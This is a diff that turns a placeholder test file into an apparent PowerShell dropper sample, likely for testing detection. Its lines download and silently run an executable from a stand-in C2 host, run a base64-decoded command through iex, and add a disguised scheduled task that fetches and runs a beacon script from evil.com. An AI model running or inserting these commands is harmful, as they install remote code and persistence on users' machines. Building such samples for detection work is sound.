@@ -1,3 +1,11 @@
-This is a benign file for testing.
-But it contains malware simulation code: exec('malicious payload')
-And a virus signature here.
+# Suspicious PowerShell Dropper Simulation
+Invoke-WebRequest -Uri "http://malicious-c2.example.com/payload.exe" -OutFile "$env:TEMP\update.exe"
+Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden
+
+# Base64 encoded command
+$encoded = "JABjAG8AbQBtAGEAbgBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIABjAG8AbgB0AGUAbgB0AC4AcABzADEAJwA="
+$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
+iex $decoded
+
+# Persistence & C2 beacon simulation
+schtasks /create /tn "WindowsUpdateCheck" /tr "powershell -nop -exec bypass -c iex (New-Object Net.WebClient).DownloadString('http://evil.com/beacon.ps1')" /sc minute /mo 5
